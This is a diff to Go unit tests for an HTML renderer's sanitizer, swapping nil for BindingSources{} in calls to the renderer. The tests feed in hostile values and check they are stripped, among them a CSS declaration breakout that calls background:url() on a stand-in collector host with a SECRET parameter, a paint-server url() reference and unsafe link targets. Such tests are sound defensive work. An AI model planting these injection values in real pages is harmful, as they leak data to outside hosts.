@@ -33,7 +33,7 @@ import (
 
 func TestGridTemplateColumnsRefusesAValueThatLeavesItsDeclaration(t *testing.T) {
 	node := mustDecode(t, `{"id":"g","kind":{"$type":"Box","children":[],"layout":{"$type":"Grid","cols":2,"templateColumns":"1fr;background:url(https://collector.example/?d=SECRET)"},"role":"Group"}}`)
-	html := renderHTML(t, node, nil)
+	html := renderHTML(t, node, BindingSources{})
 	for _, forbidden := range []string{"collector.example", "SECRET", "url("} {
 		if strings.Contains(html, forbidden) {
 			t.Errorf("html leaked %q:\n%s", forbidden, html)
@@ -55,7 +55,7 @@ func TestGridTemplateColumnsAllowTwins(t *testing.T) {
 	cases := []string{"1fr 2fr auto", "repeat(auto-fit, minmax(150px, 1fr))", "min-content max-content"}
 	for _, template := range cases {
 		node := mustDecode(t, `{"id":"g","kind":{"$type":"Box","children":[],"layout":{"$type":"Grid","cols":2,"templateColumns":`+quote(template)+`},"role":"Group"}}`)
-		html := renderHTML(t, node, nil)
+		html := renderHTML(t, node, BindingSources{})
 		if !strings.Contains(html, "grid-template-columns:"+template) {
 			t.Errorf("template %q was not emitted verbatim:\n%s", template, html)
 		}
@@ -69,7 +69,7 @@ func TestGridWithNoTemplateIsUnchangedFromBeforeTheGate(t *testing.T) {
 	// The gate must be invisible where nothing declared anything. This fails if
 	// sanitizeCSSValueForSlot ever starts rewriting rather than passing through.
 	node := mustDecode(t, `{"id":"g","kind":{"$type":"Box","children":[],"layout":{"$type":"Grid","cols":3},"role":"Group"}}`)
-	html := renderHTML(t, node, nil)
+	html := renderHTML(t, node, BindingSources{})
 	if !strings.Contains(html, "grid-template-columns:repeat(3, 1fr)") {
 		t.Errorf("the computed default changed:\n%s", html)
 	}
@@ -84,7 +84,7 @@ func TestDrawingPaintRefusesAPaintServerReference(t *testing.T) {
 	// FETCHES. Only a positive grammar excludes it, which is why the paint slots
 	// have one.
 	node := mustDecode(t, `{"id":"d","kind":{"$type":"Drawing","shapes":[{"$type":"Circle","cx":5,"cy":5,"r":2,"style":{"fill":{"$type":"Static","value":"url(https://collector.example/x)"}}}],"style":{},"viewBox":{"height":10,"minX":0,"minY":0,"width":10}}}`)
-	html := renderHTML(t, node, nil)
+	html := renderHTML(t, node, BindingSources{})
 	if strings.Contains(html, "collector.example") {
 		t.Errorf("a paint server reference reached the document:\n%s", html)
 	}
@@ -99,7 +99,7 @@ func TestDrawingPaintAllowTwins(t *testing.T) {
 	// repainted, not reported.
 	for _, paint := range []string{"#39c", "#336699", "steelblue", "currentColor", "rgb(1 2 3)"} {
 		node := mustDecode(t, `{"id":"d","kind":{"$type":"Drawing","shapes":[{"$type":"Circle","cx":5,"cy":5,"r":2,"style":{"fill":{"$type":"Static","value":`+quote(paint)+`}}}],"style":{},"viewBox":{"height":10,"minX":0,"minY":0,"width":10}}}`)
-		html := renderHTML(t, node, nil)
+		html := renderHTML(t, node, BindingSources{})
 		if !strings.Contains(html, `fill="`+paint+`"`) {
 			t.Errorf("paint %q was not emitted verbatim:\n%s", paint, html)
 		}
@@ -113,7 +113,7 @@ func TestLinkAnchorTokensAreClosedAndTheSafePairIsForced(t *testing.T) {
 	// `opener` mattered: it OVERRIDES a user-agent default no document can know
 	// the version floor of.
 	node := mustDecode(t, `{"id":"l","kind":{"$type":"Link","download":false,"href":{"$type":"Static","value":"/about"},"label":"About","rel":"opener","target":"_blank"}}`)
-	html := renderHTML(t, node, nil)
+	html := renderHTML(t, node, BindingSources{})
 	if !strings.Contains(html, `rel="noopener noreferrer"`) {
 		t.Errorf("the safe pair is not forced:\n%s", html)
 	}
@@ -128,7 +128,7 @@ func TestLinkTargetOutsideTheClosedSetIsOmittedNotSubstituted(t *testing.T) {
 	// never wrote, and the two are the same navigation anyway.
 	for _, target := range []string{"victim", "_parent", "_top"} {
 		node := mustDecode(t, `{"id":"l","kind":{"$type":"Link","download":false,"href":{"$type":"Static","value":"/about"},"label":"About","target":`+quote(target)+`}}`)
-		html := renderHTML(t, node, nil)
+		html := renderHTML(t, node, BindingSources{})
 		if strings.Contains(html, "target=") {
 			t.Errorf("target %q was honoured:\n%s", target, html)
 		}
@@ -140,7 +140,7 @@ func TestLinkTargetOutsideTheClosedSetIsOmittedNotSubstituted(t *testing.T) {
 
 func TestLinkAnchorAllowTwins(t *testing.T) {
 	node := mustDecode(t, `{"id":"l","kind":{"$type":"Link","download":false,"href":{"$type":"Static","value":"/about"},"label":"About","rel":"nofollow","target":"_self"}}`)
-	html := renderHTML(t, node, nil)
+	html := renderHTML(t, node, BindingSources{})
 	if !strings.Contains(html, `rel="nofollow"`) || !strings.Contains(html, `target="_self"`) {
 		t.Errorf("a legitimate anchor did not survive:\n%s", html)
 	}
@@ -151,7 +151,7 @@ func TestLinkAnchorAllowTwins(t *testing.T) {
 	// A link declaring neither slot emits neither attribute — unchanged from
 	// before the gate.
 	bare := mustDecode(t, `{"id":"l","kind":{"$type":"Link","download":false,"href":{"$type":"Static","value":"/about"},"label":"About"}}`)
-	bareHTML := renderHTML(t, bare, nil)
+	bareHTML := renderHTML(t, bare, BindingSources{})
 	if strings.Contains(bareHTML, "rel=") || strings.Contains(bareHTML, "target=") {
 		t.Errorf("a bare link grew an attribute:\n%s", bareHTML)
 	}
